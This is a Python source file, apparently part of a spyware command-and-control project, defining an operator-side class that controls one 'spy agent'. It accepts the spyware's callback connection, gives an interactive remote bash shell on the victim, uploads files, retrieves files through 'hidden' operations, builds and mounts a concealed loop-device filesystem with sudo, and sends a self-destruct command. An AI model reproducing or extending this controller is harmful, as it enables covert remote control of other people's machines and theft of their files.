from connection import Connection
from listener import Listener
from command import Command
from responce import Responce
from funCode import FunCode
from status import Status
from contParams import *
from icecream import ic

"""this class is for controling 1 spy agent"""


class Agent:

    def __init__(self, conn: Connection, type="maneger") -> None:
        self.conn = conn
        self.type = type
        self.mountedFS = False
        self.mountPath = "DefaultMount"  # so its obviuos when debugging

    def __repr__(self) -> str:
        return f"Agent(self.conn={self.self.conn}, self.type={self.type})"

    @classmethod
    def listenSpyware(cls, listen_addr: tuple[str, int]):
        host, port = listen_addr
        with Listener(host, port) as listener:
            conn = listener.accept()
        return Agent(conn, "spy")

    def run_bash(self, bash: str) -> tuple[Responce, str]:
        self.conn.send_command(Command(len(bash), FunCode.RUN_BASH, 0, 0, bash))
        return self.conn.recv_full_responce()

    """
    goes into loop of reading a command from stdin and executing on red side
    stops on sigint (or other exception/interrupt) or q
    """

    def bash_mode(self):
        try:
            while True:
                line = input("$ ")
                if line == "q":
                    break
                print(self.run_bash(line))
        except Exception as e:
            print(e)

    def write_file(self, homeFilePath, targetFileName: str) -> Responce:

        with open(homeFilePath, "rb") as file:
            fileContent = file.read()

        self.conn.send_command(
            Command(ic(len(fileContent)), FunCode.WRITE_FILE, 0, 1, targetFileName)
        )
        self.conn.send_data(fileContent)
        return self.conn.recv_responce_struct()

    def retrieve_file(self, fileName) -> tuple[Responce, bytes]:
        self.conn.send_command(
            Command(
                0,
                FunCode.HIDDEN_OPRATION | FunCode.HIDDEN_RETREIVE_FILE,
                0,
                0,
                fileName,
            )
        )
        file_data = self.conn.recv_file()
        res = self.conn.recv_responce_struct()
        return res, file_data

    def hidden_action_without_upload(self, fncode: FunCode) -> tuple[Responce, str]:
        assert FunCode.HIDDEN_UPLOAD not in fncode

        self.conn.send_command(Command(0, FunCode.HIDDEN_OPRATION | fncode, 0, 1, ""))
        results = list()
        results.append(self.conn.recv_bytes(Status.sizeof))
        results.append(self.conn.recv_bytes(Status.sizeof))
        results.append(self.conn.recv_bytes(Status.sizeof))
        return self.conn.recv_full_responce(), results

    def hidden_action_with_upload(
        self, fncode: FunCode, homeFilePath, targetFileName: str
    ) -> tuple[Responce, str]:
        assert FunCode.HIDDEN_UPLOAD in fncode

        with open(homeFilePath, "rb") as file:
            fileContent = file.read()

        self.conn.send_command(
            Command(
                len(fileContent),
                FunCode.HIDDEN_OPRATION | fncode,
                0,
                1,
                targetFileName,
            )
        )
        self.conn.send_data(fileContent)
        results = list()
        results.append(self.conn.recv_responce_struct())
        results.append(self.conn.recv_responce_struct())
        results.append(self.conn.recv_responce_struct())
        return self.conn.recv_full_responce(), results

    # prob redundant in future
    def hider_setup(self, hiderPath: str, imagePath: str, mountPath: str) -> Responce:
        self.mountPath = mountPath
        strParam = hiderPath + ";" + imagePath + ";" + mountPath
        self.conn.send_command(Command(0, FunCode.HIDER_SETUP, 0, 0, strParam))
        self.hiding_env_setup(imagePath)

        return self.conn.recv_responce_struct()

    def hiding_env_setup(self, imagePath: str):
        res = self.run_bash(f"file {imagePath}")
        if "ext4" not in res:
            self.run_bash(f"dd if=/dev/zero of={imagePath} bs=1M count=100")
            self.run_bash(f"sudo losetup /dev/loop0 {imagePath}")
            self.run_bash(f"sudo mkfs.ext4 /dev/loop0")
        self.mountFS()

    def mountFS(self):
        self.run_bash(f"sudo mkdir {self.mountPath}")
        self.run_bash(f"sudo mount /dev/loop0 {self.mountPath}")

    def unmountFS(self):
        self.run_bash(f"sudo umount {self.mountPath}")
        self.run_bash(f"rm {self.mountPath}")
        self.run_bash(f"sudo losetup -d /dev/loop0")

    def validateSelf(self) -> str:
        machine_id = self.conn.recv_len_and_string()
        return machine_id

    def suicide(self):
        self.unmountFS()
        self.conn.send_command(Command(0, FunCode.SUICIDE, 0, 0, ""))
        res = self.conn.recv_responce_struct()
        assert res.status == Status.SUICIDE_SUCSESS, "FAILED TO SUICIDE"
        return res

    def runContraption(self, params: ContParams, identifier: int):
        self.conn.send_command(Command(0, FunCode.RunContraption, identifier, 0, ""))
        self.conn.send_data(bytes(params))
        res = self.conn.recv_responce_struct()
        return res
